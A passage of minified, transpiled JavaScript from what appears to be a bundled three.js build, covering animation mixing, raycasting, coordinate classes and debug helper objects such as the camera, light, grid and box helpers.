e}r=0}this.clampWhenFinished?this.paused=!0:this.enabled=!1,this.time=r,this._mixer.dispatchEvent({type:"finished",action:this,direction:e<0?-1:1})}}else{if(-1===i&&(0<=e?(i=0,this._setEndings(!0,0===this.repetitions,a)):this._setEndings(0===this.repetitions,!0,a)),t<=r||r<0){var o=Math.floor(r/t);r-=t*o,i+=Math.abs(o);var s=this.repetitions-i;if(s<=0)this.clampWhenFinished?this.paused=!0:this.enabled=!1,r=0<e?t:0,this.time=r,this._mixer.dispatchEvent({type:"finished",action:this,direction:0<e?1:-1});else{if(1===s){var l=e<0;this._setEndings(l,!l,a)}else this._setEndings(!1,!1,a);this._loopCount=i,this.time=r,this._mixer.dispatchEvent({type:"loop",action:this,loopDelta:o})}}else this.time=r;if(a&&1==(1&i))return t-r}return r}},{key:"_setEndings",value:function(e,t,n){var r=this._interpolantSettings;r.endingEnd=n?r.endingStart=2401:(r.endingStart=e?this.zeroSlopeAtStart?2401:2400:2402,t?this.zeroSlopeAtEnd?2401:2400:2402)}},{key:"_scheduleFading",value:function(e,t,n){var r=this._mixer,i=r.time,a=this._weightInterpolant;null===a&&(a=r._lendControlInterpolant(),this._weightInterpolant=a);var o=a.parameterPositions,s=a.sampleValues;return o[0]=i,s[0]=t,o[1]=i+e,s[1]=n,this}}]),e}(),su=function(e){_inherits2(n,H);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this))._root=e,r._initMemoryManager(),r._accuIndex=0,r.time=0,r.timeScale=1,r}return _createClass2(n,[{key:"_bindAction",value:function(e,t){var n=e._localRoot||this._root,r=e._clip.tracks,i=r.length,a=e._propertyBindings,o=e._interpolants,s=n.uuid,l=this._bindingsByRootAndName,c=l[s];void 0===c&&(c={},l[s]=c);for(var u=0;u!==i;++u){var d=r[u],p=d.name,h=c[p];if(void 0!==h)a[u]=h;else{if(void 0!==(h=a[u])){null===h._cacheIndex&&(++h.referenceCount,this._addInactiveBinding(h,s,p));continue}var f=t&&t._propertyBindings[u].binding.parsedPath;++(h=new Gc(iu.create(n,p,f),d.ValueTypeName,d.getValueSize())).referenceCount,this._addInactiveBinding(h,s,p),a[u]=h}o[u].resultBuffer=h.buffer}}},{key:"_activateAction",value:function(e){if(!this._isActiveAction(e)){if(null===e._cacheIndex){var t=(e._localRoot||this._root).uuid,n=e._clip.uuid,r=this._actionsByClip[n];this._bindAction(e,r&&r.knownActions[0]),this._addInactiveAction(e,n,t)}for(var i=e._propertyBindings,a=0,o=i.length;a!==o;++a){var s=i[a];0==s.useCount++&&(this._lendBinding(s),s.saveOriginalState())}this._lendAction(e)}}},{key:"_deactivateAction",value:function(e){if(this._isActiveAction(e)){for(var t=e._propertyBindings,n=0,r=t.length;n!==r;++n){var i=t[n];0==--i.useCount&&(i.restoreOriginalState(),this._takeBackBinding(i))}this._takeBackAction(e)}}},{key:"_initMemoryManager",value:function(){this._actions=[],this._nActiveActions=0,this._actionsByClip={},this._bindings=[],this._nActiveBindings=0,this._bindingsByRootAndName={},this._controlInterpolants=[],this._nActiveControlInterpolants=0;var e=this;this.stats={actions:{get total(){return e._actions.length},get inUse(){return e._nActiveActions}},bindings:{get total(){return e._bindings.length},get inUse(){return e._nActiveBindings}},controlInterpolants:{get total(){return e._controlInterpolants.length},get inUse(){return e._nActiveControlInterpolants}}}}},{key:"_isActiveAction",value:function(e){var t=e._cacheIndex;return null!==t&&t<this._nActiveActions}},{key:"_addInactiveAction",value:function(e,t,n){var r=this._actions,i=this._actionsByClip,a=i[t];if(void 0===a)a={knownActions:[e],actionByRoot:{}},e._byClipCacheIndex=0,i[t]=a;else{var o=a.knownActions;e._byClipCacheIndex=o.length,o.push(e)}e._cacheIndex=r.length,r.push(e),a.actionByRoot[n]=e}},{key:"_removeInactiveAction",value:function(e){var t=this._actions,n=t[t.length-1],r=e._cacheIndex;t[n._cacheIndex=r]=n,t.pop(),e._cacheIndex=null;var i=e._clip.uuid,a=this._actionsByClip,o=a[i],s=o.knownActions,l=s[s.length-1],c=e._byClipCacheIndex;s[l._byClipCacheIndex=c]=l,s.pop(),e._byClipCacheIndex=null,delete o.actionByRoot[(e._localRoot||this._root).uuid],0===s.length&&delete a[i],this._removeInactiveBindingsForAction(e)}},{key:"_removeInactiveBindingsForAction",value:function(e){for(var t=e._propertyBindings,n=0,r=t.length;n!==r;++n){var i=t[n];0==--i.referenceCount&&this._removeInactiveBinding(i)}}},{key:"_lendAction",value:function(e){var t=this._actions,n=e._cacheIndex,r=this._nActiveActions++,i=t[r];t[e._cacheIndex=r]=e,t[i._cacheIndex=n]=i}},{key:"_takeBackAction",value:function(e){var t=this._actions,n=e._cacheIndex,r=--this._nActiveActions,i=t[r];t[e._cacheIndex=r]=e,t[i._cacheIndex=n]=i}},{key:"_addInactiveBinding",value:function(e,t,n){var r=this._bindingsByRootAndName,i=this._bindings,a=r[t];void 0===a&&(a={},r[t]=a),(a[n]=e)._cacheIndex=i.length,i.push(e)}},{key:"_removeInactiveBinding",value:function(e){var t=this._bindings,n=e.binding,r=n.rootNode.uuid,i=n.path,a=this._bindingsByRootAndName,o=a[r],s=t[t.length-1],l=e._cacheIndex;t[s._cacheIndex=l]=s,t.pop(),delete o[i],0===Object.keys(o).length&&delete a[r]}},{key:"_lendBinding",value:function(e){var t=this._bindings,n=e._cacheIndex,r=this._nActiveBindings++,i=t[r];t[e._cacheIndex=r]=e,t[i._cacheIndex=n]=i}},{key:"_takeBackBinding",value:function(e){var t=this._bindings,n=e._cacheIndex,r=--this._nActiveBindings,i=t[r];t[e._cacheIndex=r]=e,t[i._cacheIndex=n]=i}},{key:"_lendControlInterpolant",value:function(){var e=this._controlInterpolants,t=this._nActiveControlInterpolants++,n=e[t];return void 0===n&&(e[(n=new Sl(new Float32Array(2),new Float32Array(2),1,this._controlInterpolantsResultBuffer)).__cacheIndex=t]=n),n}},{key:"_takeBackControlInterpolant",value:function(e){var t=this._controlInterpolants,n=e.__cacheIndex,r=--this._nActiveControlInterpolants,i=t[r];t[e.__cacheIndex=r]=e,t[i.__cacheIndex=n]=i}},{key:"clipAction",value:function(e,t,n){var r=t||this._root,i=r.uuid,a="string"==typeof e?Ol.findByName(r,e):e,o=null!==a?a.uuid:e,s=this._actionsByClip[o],l=null;if(void 0===n&&(n=null!==a?a.blendMode:2500),void 0!==s){var c=s.actionByRoot[i];if(void 0!==c&&c.blendMode===n)return c;l=s.knownActions[0],null===a&&(a=l._clip)}if(null===a)return null;var u=new ou(this,a,t,n);return this._bindAction(u,l),this._addInactiveAction(u,o,i),u}},{key:"existingAction",value:function(e,t){var n=t||this._root,r=n.uuid,i="string"==typeof e?Ol.findByName(n,e):e,a=i?i.uuid:e,o=this._actionsByClip[a];return void 0!==o&&o.actionByRoot[r]||null}},{key:"stopAllAction",value:function(){for(var e=this._actions,t=this._nActiveActions-1;0<=t;--t)e[t].stop();return this}},{key:"update",value:function(e){e*=this.timeScale;for(var t=this._actions,n=this._nActiveActions,r=this.time+=e,i=Math.sign(e),a=this._accuIndex^=1,o=0;o!==n;++o)t[o]._update(r,e,i,a);for(var s=this._bindings,l=this._nActiveBindings,c=0;c!==l;++c)s[c].apply(a);return this}},{key:"setTime",value:function(e){for(var t=this.time=0;t<this._actions.length;t++)this._actions[t].time=0;return this.update(e)}},{key:"getRoot",value:function(){return this._root}},{key:"uncacheClip",value:function(e){var t=this._actions,n=e.uuid,r=this._actionsByClip,i=r[n];if(void 0!==i){for(var a=i.knownActions,o=0,s=a.length;o!==s;++o){var l=a[o];this._deactivateAction(l);var c=l._cacheIndex,u=t[t.length-1];l._cacheIndex=null,l._byClipCacheIndex=null,t[u._cacheIndex=c]=u,t.pop(),this._removeInactiveBindingsForAction(l)}delete r[n]}}},{key:"uncacheRoot",value:function(e){var t=e.uuid,n=this._actionsByClip;for(var r in n){var i=n[r].actionByRoot[t];void 0!==i&&(this._deactivateAction(i),this._removeInactiveAction(i))}var a=this._bindingsByRootAndName[t];if(void 0!==a)for(var o in a){var s=a[o];s.restoreOriginalState(),this._removeInactiveBinding(s)}}},{key:"uncacheAction",value:function(e,t){var n=this.existingAction(e,t);null!==n&&(this._deactivateAction(n),this._removeInactiveAction(n))}}]),n}();su.prototype._controlInterpolantsResultBuffer=new Float32Array(1);var lu=function(){function e(t){_classCallCheck2(this,e),"string"==typeof t&&(t=arguments[1]),this.value=t}return _createClass2(e,[{key:"clone",value:function(){return new e(void 0===this.value.clone?this.value:this.value.clone())}}]),e}(),cu=function(e){_inherits2(n,ja);var t=_createSuper(n);function n(e,r){var i,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:1;return _classCallCheck2(this,n),(i=t.call(this,e,r)).meshPerAttribute=a,i}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.meshPerAttribute=e.meshPerAttribute,this}},{key:"clone",value:function(e){var t=_get2(_getPrototypeOf(n.prototype),"clone",this).call(this,e);return t.meshPerAttribute=this.meshPerAttribute,t}},{key:"toJSON",value:function(e){var t=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this,e);return t.isInstancedInterleavedBuffer=!0,t.meshPerAttribute=this.meshPerAttribute,t}}]),n}();cu.prototype.isInstancedInterleavedBuffer=!0;var uu=function(){function e(t,n,r,i,a){_classCallCheck2(this,e),this.buffer=t,this.type=n,this.itemSize=r,this.elementSize=i,this.count=a,this.version=0}return _createClass2(e,[{key:"setBuffer",value:function(e){return this.buffer=e,this}},{key:"setType",value:function(e,t){return this.type=e,this.elementSize=t,this}},{key:"setItemSize",value:function(e){return this.itemSize=e,this}},{key:"setCount",value:function(e){return this.count=e,this}},{key:"needsUpdate",set:function(e){!0===e&&this.version++}}]),e}();uu.prototype.isGLBufferAttribute=!0;var du=function(){function e(t,n){var r=2<arguments.length&&void 0!==arguments[2]?arguments[2]:0,i=3<arguments.length&&void 0!==arguments[3]?arguments[3]:1/0;_classCallCheck2(this,e),this.ray=new qe(t,n),this.near=r,this.far=i,this.camera=null,this.layers=new st,this.params={Mesh:{},Line:{threshold:1},LOD:{},Points:{threshold:1},Sprite:{}}}return _createClass2(e,[{key:"set",value:function(e,t){this.ray.set(e,t)}},{key:"setFromCamera",value:function(e,t){t&&t.isPerspectiveCamera?(this.ray.origin.setFromMatrixPosition(t.matrixWorld),this.ray.direction.set(e.x,e.y,.5).unproject(t).sub(this.ray.origin).normalize(),this.camera=t):t&&t.isOrthographicCamera&&(this.ray.origin.set(e.x,e.y,(t.near+t.far)/(t.near-t.far)).unproject(t),this.ray.direction.set(0,0,-1).transformDirection(t.matrixWorld),this.camera=t)}},{key:"intersectObject",value:function(e){var t=!(1<arguments.length&&void 0!==arguments[1])||arguments[1],n=2<arguments.length&&void 0!==arguments[2]?arguments[2]:[];return hu(e,this,n,t),n.sort(pu),n}},{key:"intersectObjects",value:function(e){for(var t=!(1<arguments.length&&void 0!==arguments[1])||arguments[1],n=2<arguments.length&&void 0!==arguments[2]?arguments[2]:[],r=0,i=e.length;r<i;r++)hu(e[r],this,n,t);return n.sort(pu),n}}]),e}();function pu(e,t){return e.distance-t.distance}function hu(e,t,n,r){if(e.layers.test(t.layers)&&e.raycast(t,n),!0===r)for(var i=e.children,a=0,o=i.length;a<o;a++)hu(i[a],t,n,!0)}var fu=function(){function e(){var t=0<arguments.length&&void 0!==arguments[0]?arguments[0]:1,n=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0,r=2<arguments.length&&void 0!==arguments[2]?arguments[2]:0;return _classCallCheck2(this,e),this.radius=t,this.phi=n,this.theta=r,this}return _createClass2(e,[{key:"set",value:function(e,t,n){return this.radius=e,this.phi=t,this.theta=n,this}},{key:"copy",value:function(e){return this.radius=e.radius,this.phi=e.phi,this.theta=e.theta,this}},{key:"makeSafe",value:function(){return this.phi=Math.max(1e-6,Math.min(Math.PI-1e-6,this.phi)),this}},{key:"setFromVector3",value:function(e){return this.setFromCartesianCoords(e.x,e.y,e.z)}},{key:"setFromCartesianCoords",value:function(e,t,n){return this.radius=Math.sqrt(e*e+t*t+n*n),0===this.radius?(this.theta=0,this.phi=0):(this.theta=Math.atan2(e,n),this.phi=Math.acos(X(t/this.radius,-1,1))),this}},{key:"clone",value:function(){return(new this.constructor).copy(this)}}]),e}(),Au=function(){function e(){var t=0<arguments.length&&void 0!==arguments[0]?arguments[0]:1,n=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0,r=2<arguments.length&&void 0!==arguments[2]?arguments[2]:0;return _classCallCheck2(this,e),this.radius=t,this.theta=n,this.y=r,this}return _createClass2(e,[{key:"set",value:function(e,t,n){return this.radius=e,this.theta=t,this.y=n,this}},{key:"copy",value:function(e){return this.radius=e.radius,this.theta=e.theta,this.y=e.y,this}},{key:"setFromVector3",value:function(e){return this.setFromCartesianCoords(e.x,e.y,e.z)}},{key:"setFromCartesianCoords",value:function(e,t,n){return this.radius=Math.sqrt(e*e+n*n),this.theta=Math.atan2(e,n),this.y=t,this}},{key:"clone",value:function(){return(new this.constructor).copy(this)}}]),e}(),mu=new re,vu=function(){function e(){var t=0<arguments.length&&void 0!==arguments[0]?arguments[0]:new re(1/0,1/0),n=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new re(-1/0,-1/0);_classCallCheck2(this,e),this.min=t,this.max=n}return _createClass2(e,[{key:"set",value:function(e,t){return this.min.copy(e),this.max.copy(t),this}},{key:"setFromPoints",value:function(e){this.makeEmpty();for(var t=0,n=e.length;t<n;t++)this.expandByPoint(e[t]);return this}},{key:"setFromCenterAndSize",value:function(e,t){var n=mu.copy(t).multiplyScalar(.5);return this.min.copy(e).sub(n),this.max.copy(e).add(n),this}},{key:"clone",value:function(){return(new this.constructor).copy(this)}},{key:"copy",value:function(e){return this.min.copy(e.min),this.max.copy(e.max),this}},{key:"makeEmpty",value:function(){return this.min.x=this.min.y=1/0,this.max.x=this.max.y=-1/0,this}},{key:"isEmpty",value:function(){return this.max.x<this.min.x||this.max.y<this.min.y}},{key:"getCenter",value:function(e){return this.isEmpty()?e.set(0,0):e.addVectors(this.min,this.max).multiplyScalar(.5)}},{key:"getSize",value:function(e){return this.isEmpty()?e.set(0,0):e.subVectors(this.max,this.min)}},{key:"expandByPoint",value:function(e){return this.min.min(e),this.max.max(e),this}},{key:"expandByVector",value:function(e){return this.min.sub(e),this.max.add(e),this}},{key:"expandByScalar",value:function(e){return this.min.addScalar(-e),this.max.addScalar(e),this}},{key:"containsPoint",value:function(e){return!(e.x<this.min.x||e.x>this.max.x||e.y<this.min.y||e.y>this.max.y)}},{key:"containsBox",value:function(e){return this.min.x<=e.min.x&&e.max.x<=this.max.x&&this.min.y<=e.min.y&&e.max.y<=this.max.y}},{key:"getParameter",value:function(e,t){return t.set((e.x-this.min.x)/(this.max.x-this.min.x),(e.y-this.min.y)/(this.max.y-this.min.y))}},{key:"intersectsBox",value:function(e){return!(e.max.x<this.min.x||e.min.x>this.max.x||e.max.y<this.min.y||e.min.y>this.max.y)}},{key:"clampPoint",value:function(e,t){return t.copy(e).clamp(this.min,this.max)}},{key:"distanceToPoint",value:function(e){return mu.copy(e).clamp(this.min,this.max).sub(e).length()}},{key:"intersect",value:function(e){return this.min.max(e.min),this.max.min(e.max),this}},{key:"union",value:function(e){return this.min.min(e.min),this.max.max(e.max),this}},{key:"translate",value:function(e){return this.min.add(e),this.max.add(e),this}},{key:"equals",value:function(e){return e.min.equals(this.min)&&e.max.equals(this.max)}}]),e}();vu.prototype.isBox2=!0;var gu=new ye,yu=new ye,bu=function(){function e(){var t=0<arguments.length&&void 0!==arguments[0]?arguments[0]:new ye,n=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new ye;_classCallCheck2(this,e),this.start=t,this.end=n}return _createClass2(e,[{key:"set",value:function(e,t){return this.start.copy(e),this.end.copy(t),this}},{key:"copy",value:function(e){return this.start.copy(e.start),this.end.copy(e.end),this}},{key:"getCenter",value:function(e){return e.addVectors(this.start,this.end).multiplyScalar(.5)}},{key:"delta",value:function(e){return e.subVectors(this.end,this.start)}},{key:"distanceSq",value:function(){return this.start.distanceToSquared(this.end)}},{key:"distance",value:function(){return this.start.distanceTo(this.end)}},{key:"at",value:function(e,t){return this.delta(t).multiplyScalar(e).add(this.start)}},{key:"closestPointToPointParameter",value:function(e,t){gu.subVectors(e,this.start),yu.subVectors(this.end,this.start);var n=yu.dot(yu),r=yu.dot(gu)/n;return t&&(r=X(r,0,1)),r}},{key:"closestPointToPoint",value:function(e,t,n){var r=this.closestPointToPointParameter(e,t);return this.delta(n).multiplyScalar(r).add(this.start)}},{key:"applyMatrix4",value:function(e){return this.start.applyMatrix4(e),this.end.applyMatrix4(e),this}},{key:"equals",value:function(e){return e.start.equals(this.start)&&e.end.equals(this.end)}},{key:"clone",value:function(){return(new this.constructor).copy(this)}}]),e}(),_u=new ye,wu=function(e){_inherits2(n,_t);var t=_createSuper(n);function n(e,r){var i;_classCallCheck2(this,n),(i=t.call(this)).light=e,i.light.updateMatrixWorld(),i.matrix=e.matrixWorld,i.matrixAutoUpdate=!1,i.color=r;for(var a=new un,o=[0,0,0,0,0,1,0,0,0,1,0,1,0,0,0,-1,0,1,0,0,0,0,1,1,0,0,0,0,-1,1],s=0,l=1;s<32;s++,l++){var c=s/32*Math.PI*2,u=l/32*Math.PI*2;o.push(Math.cos(c),Math.sin(c),1,Math.cos(u),Math.sin(u),1)}a.setAttribute("position",new en(o,3));var d=new So({fog:!1,toneMapped:!1});return i.cone=new Lo(a,d),i.add(i.cone),i.update(),i}return _createClass2(n,[{key:"dispose",value:function(){this.cone.geometry.dispose(),this.cone.material.dispose()}},{key:"update",value:function(){this.light.updateMatrixWorld();var e=this.light.distance?this.light.distance:1e3,t=e*Math.tan(this.light.angle);this.cone.scale.set(t,t,e),_u.setFromMatrixPosition(this.light.target.matrixWorld),this.cone.lookAt(_u),void 0!==this.color?this.cone.material.color.set(this.color):this.cone.material.color.copy(this.light.color)}}]),n}(),Cu=new ye,xu=new Xe,Su=new Xe,ku=function(e){_inherits2(n,Lo);var t=_createSuper(n);function n(e){var r;_classCallCheck2(this,n);for(var i=function e(t){var n=[];t&&t.isBone&&n.push(t);for(var r=0;r<t.children.length;r++)n.push.apply(n,e(t.children[r]));return n}(e),a=new un,o=[],s=[],l=new $t(0,0,1),c=new $t(0,1,0),u=0;u<i.length;u++){var d=i[u];d.parent&&d.parent.isBone&&(o.push(0,0,0),o.push(0,0,0),s.push(l.r,l.g,l.b),s.push(c.r,c.g,c.b))}a.setAttribute("position",new en(o,3)),a.setAttribute("color",new en(s,3));var p=new So({vertexColors:!0,depthTest:!1,depthWrite:!1,toneMapped:!1,transparent:!0});return(r=t.call(this,a,p)).type="SkeletonHelper",r.isSkeletonHelper=!0,r.root=e,r.bones=i,r.matrix=e.matrixWorld,r.matrixAutoUpdate=!1,r}return _createClass2(n,[{key:"updateMatrixWorld",value:function(e){var t=this.bones,r=this.geometry,i=r.getAttribute("position");Su.copy(this.root.matrixWorld).invert();for(var a=0,o=0;a<t.length;a++){var s=t[a];s.parent&&s.parent.isBone&&(xu.multiplyMatrices(Su,s.matrixWorld),Cu.setFromMatrixPosition(xu),i.setXYZ(o,Cu.x,Cu.y,Cu.z),xu.multiplyMatrices(Su,s.parent.matrixWorld),Cu.setFromMatrixPosition(xu),i.setXYZ(o+1,Cu.x,Cu.y,Cu.z),o+=2)}r.getAttribute("position").needsUpdate=!0,_get2(_getPrototypeOf(n.prototype),"updateMatrixWorld",this).call(this,e)}}]),n}(),Mu=function(e){_inherits2(n,Bn);var t=_createSuper(n);function n(e,r,i){var a;_classCallCheck2(this,n);var o=new il(r,4,2),s=new zt({wireframe:!0,fog:!1,toneMapped:!1});return(a=t.call(this,o,s)).light=e,a.light.updateMatrixWorld(),a.color=i,a.type="PointLightHelper",a.matrix=a.light.matrixWorld,a.matrixAutoUpdate=!1,a.update(),a}return _createClass2(n,[{key:"dispose",value:function(){this.geometry.dispose(),this.material.dispose()}},{key:"update",value:function(){void 0!==this.color?this.material.color.set(this.color):this.material.color.copy(this.light.color)}}]),n}(),Bu=new ye,Eu=new $t,Tu=new $t,Pu=function(e){_inherits2(n,_t);var t=_createSuper(n);function n(e,r,i){var a;_classCallCheck2(this,n),(a=t.call(this)).light=e,a.light.updateMatrixWorld(),a.matrix=e.matrixWorld,a.matrixAutoUpdate=!1,a.color=i;var o=new tl(r);o.rotateY(.5*Math.PI),a.material=new zt({wireframe:!0,fog:!1,toneMapped:!1}),void 0===a.color&&(a.material.vertexColors=!0);var s=o.getAttribute("position"),l=new Float32Array(3*s.count);return o.setAttribute("color",new Qt(l,3)),a.add(new Bn(o,a.material)),a.update(),a}return _createClass2(n,[{key:"dispose",value:function(){this.children[0].geometry.dispose(),this.children[0].material.dispose()}},{key:"update",value:function(){var e=this.children[0];if(void 0!==this.color)this.material.color.set(this.color);else{var t=e.geometry.getAttribute("color");Eu.copy(this.light.color),Tu.copy(this.light.groundColor);for(var n=0,r=t.count;n<r;n++){var i=n<r/2?Eu:Tu;t.setXYZ(n,i.r,i.g,i.b)}t.needsUpdate=!0}e.lookAt(Bu.setFromMatrixPosition(this.light.matrixWorld).negate())}}]),n}(),Iu=function(e){_inherits2(n,Lo);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:10,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:10,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:4473924,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:8947848;_classCallCheck2(this,n),a=new $t(a),o=new $t(o);for(var s=i/2,l=r/i,c=r/2,u=[],d=[],p=0,h=0,f=-c;p<=i;p++,f+=l){u.push(-c,0,f,c,0,f),u.push(f,0,-c,f,0,c);var A=p===s?a:o;A.toArray(d,h),h+=3,A.toArray(d,h),h+=3,A.toArray(d,h),h+=3,A.toArray(d,h),h+=3}var m=new un;m.setAttribute("position",new en(u,3)),m.setAttribute("color",new en(d,3));var v=new So({vertexColors:!0,toneMapped:!1});return(e=t.call(this,m,v)).type="GridHelper",e}return n}(),Fu=function(e){_inherits2(n,Lo);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:10,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:16,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:8,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:64,s=4<arguments.length&&void 0!==arguments[4]?arguments[4]:4473924,l=5<arguments.length&&void 0!==arguments[5]?arguments[5]:8947848;_classCallCheck2(this,n),s=new $t(s),l=new $t(l);for(var c=[],u=[],d=0;d<=i;d++){var p=d/i*(2*Math.PI),h=Math.sin(p)*r,f=Math.cos(p)*r;c.push(0,0,0),c.push(h,0,f);var A=1&d?s:l;u.push(A.r,A.g,A.b),u.push(A.r,A.g,A.b)}for(var m=0;m<=a;m++)for(var v=1&m?s:l,g=r-r/a*m,y=0;y<o;y++){var b=y/o*(2*Math.PI),_=Math.sin(b)*g,w=Math.cos(b)*g;c.push(_,0,w),u.push(v.r,v.g,v.b),b=(y+1)/o*(2*Math.PI),_=Math.sin(b)*g,w=Math.cos(b)*g,c.push(_,0,w),u.push(v.r,v.g,v.b)}var C=new un;C.setAttribute("position",new en(c,3)),C.setAttribute("color",new en(u,3));var x=new So({vertexColors:!0,toneMapped:!1});return(e=t.call(this,C,x)).type="PolarGridHelper",e}return n}(),Lu=new ye,Ou=new ye,Nu=new ye,Du=function(e){_inherits2(n,_t);var t=_createSuper(n);function n(e,r,i){var a;_classCallCheck2(this,n),(a=t.call(this)).light=e,a.light.updateMatrixWorld(),a.matrix=e.matrixWorld,a.matrixAutoUpdate=!1,a.color=i,void 0===r&&(r=1);var o=new un;o.setAttribute("position",new en([-r,r,0,r,r,0,r,-r,0,-r,-r,0,-r,r,0],3));var s=new So({fog:!1,toneMapped:!1});return a.lightPlane=new Po(o,s),a.add(a.lightPlane),(o=new un).setAttribute("position",new en([0,0,0,0,0,1],3)),a.targetLine=new Po(o,s),a.add(a.targetLine),a.update(),a}return _createClass2(n,[{key:"dispose",value:function(){this.lightPlane.geometry.dispose(),this.lightPlane.material.dispose(),this.targetLine.geometry.dispose(),this.targetLine.material.dispose()}},{key:"update",value:function(){Lu.setFromMatrixPosition(this.light.matrixWorld),Ou.setFromMatrixPosition(this.light.target.matrixWorld),Nu.subVectors(Ou,Lu),this.lightPlane.lookAt(Ou),void 0!==this.color?(this.lightPlane.material.color.set(this.color),this.targetLine.material.color.set(this.color)):(this.lightPlane.material.color.copy(this.light.color),this.targetLine.material.color.copy(this.light.color)),this.targetLine.lookAt(Ou),this.targetLine.scale.z=Nu.length()}}]),n}(),Ru=new ye,ju=new On,Uu=function(e){_inherits2(n,Lo);var t=_createSuper(n);function n(e){var r;_classCallCheck2(this,n);var i=new un,a=new So({color:16777215,vertexColors:!0,toneMapped:!1}),o=[],s=[],l={},c=new $t(16755200),u=new $t(16711680),d=new $t(43775),p=new $t(16777215),h=new $t(3355443);function f(e,t,n){A(e,n),A(t,n)}function A(e,t){o.push(0,0,0),s.push(t.r,t.g,t.b),void 0===l[e]&&(l[e]=[]),l[e].push(o.length/3-1)}return f("n1","n2",c),f("n2","n4",c),f("n4","n3",c),f("n3","n1",c),f("f1","f2",c),f("f2","f4",c),f("f4","f3",c),f("f3","f1",c),f("n1","f1",c),f("n2","f2",c),f("n3","f3",c),f("n4","f4",c),f("p","n1",u),f("p","n2",u),f("p","n3",u),f("p","n4",u),f("u1","u2",d),f("u2","u3",d),f("u3","u1",d),f("c","t",p),f("p","c",h),f("cn1","cn2",h),f("cn3","cn4",h),f("cf1","cf2",h),f("cf3","cf4",h),i.setAttribute("position",new en(o,3)),i.setAttribute("color",new en(s,3)),(r=t.call(this,i,a)).type="CameraHelper",r.camera=e,r.camera.updateProjectionMatrix&&r.camera.updateProjectionMatrix(),r.matrix=e.matrixWorld,r.matrixAutoUpdate=!1,r.pointMap=l,r.update(),r}return _createClass2(n,[{key:"update",value:function(){var e=this.geometry,t=this.pointMap;ju.projectionMatrixInverse.copy(this.camera.projectionMatrixInverse),$u("c",t,e,ju,0,0,-1),$u("t",t,e,ju,0,0,1),$u("n1",t,e,ju,-1,-1,-1),$u("n2",t,e,ju,1,-1,-1),$u("n3",t,e,ju,-1,1,-1),$u("n4",t,e,ju,1,1,-1),$u("f1",t,e,ju,-1,-1,1),$u("f2",t,e,ju,1,-1,1),$u("f3",t,e,ju,-1,1,1),$u("f4",t,e,ju,1,1,1),$u("u1",t,e,ju,.7,1.1,-1),$u("u2",t,e,ju,-.7,1.1,-1),$u("u3",t,e,ju,0,2,-1),$u("cf1",t,e,ju,-1,0,1),$u("cf2",t,e,ju,1,0,1),$u("cf3",t,e,ju,0,-1,1),$u("cf4",t,e,ju,0,1,1),$u("cn1",t,e,ju,-1,0,-1),$u("cn2",t,e,ju,1,0,-1),$u("cn3",t,e,ju,0,-1,-1),$u("cn4",t,e,ju,0,1,-1),e.getAttribute("position").needsUpdate=!0}},{key:"dispose",value:function(){this.geometry.dispose(),this.material.dispose()}}]),n}();function $u(e,t,n,r,i,a,o){Ru.set(i,a,o).unproject(r);var s=t[e];if(void 0!==s)for(var l=n.getAttribute("position"),c=0,u=s.length;c<u;c++)l.setXYZ(s[c],Ru.x,Ru.y,Ru.z)}var zu,Hu,Vu=new we,Qu=function(e){_inherits2(n,Lo);var t=_createSuper(n);function n(e){var r,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:16776960;_classCallCheck2(this,n);var a=new Uint16Array([0,1,1,2,2,3,3,0,4,5,5,6,6,7,7,4,0,4,1,5,2,6,3,7]),o=new Float32Array(24),s=new un;return s.setIndex(new Qt(a,1)),s.setAttribute("position",new Qt(o,3)),(r=t.call(this,s,new So({color:i,toneMapped:!1}))).object=e,r.type="BoxHelper",r.matrixAutoUpdate=!1,r.update(),r}return _createClass2(n,[{key:"update",value:function(e){if(void 0!==this.object&&Vu.setFromObject(this.object),!Vu.isEmpty()){var t=Vu.min,n=Vu.max,r=this.geometry.attributes.position,i=r.array;i[0]=n.x,i[1]=n.y,i[2]=n.z,i[3]=t.x,i[4]=n.y,i[5]=n.z,i[6]=t.x,i[7]=t.y,i[8]=n.z,i[9]=n.x,i[10]=t.y,i[11]=n.z,i[12]=n.x,i[13]=n.y,i[14]=t.z,i[15]=t.x,i[16]=n.y,i[17]=t.z,i[18]=t.x,i[19]=t.y,i[20]=t.z,i[21]=n.x,i[22]=t.y,i[23]=t.z,r.needsUpdate=!0,this.geometry.computeBoundingSphere()}}},{key:"setFromObject",value:function(e){return this.object=e,this.update(),this}},{key:"copy",value:function(e){return Lo.prototype.copy.call(this,e),this.object=e.object,this}}]),n}(),Gu=function(e){_inherits2(n,Lo);var t=_createSuper(n);function n(e){var r,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:16776960;_classCallCheck2(this,n);var a=new Uint16Array([0,1,1,2,2,3,3,0,4,5,5,6,6,7,7,4,0,4,1,5,2,6,3,7]),o=new un;return o.setIndex(new Qt(a,1)),o.setAttribute("position",new en([1,1,1,-1,1,1,-1,-1,1,1,-1,1,1,1,-1,-1,1,-1,-1,-1,-1,1,-1,-1],3)),(r=t.call(this,o,new So({color:i,toneMapped:!1}))).box=e,r.type="Box3Helper",r.geometry.computeBoundingSphere(),r}return _createClass2(n,[{key:"updateMatrixWorld",value:function(e){var t=this.box;t.isEmpty()||(t.getCenter(this.position),t.getSize(this.scale),this.scale.multiplyScalar(.5),_get2(_getPrototypeOf(n.prototype),"updateMatrixWorld",this).call(this,e))}}]),n}(),Wu=function(e){_inherits2(n,Po);var t=_createSuper(n);function n(e){var r,i=1<arguments.length&&void 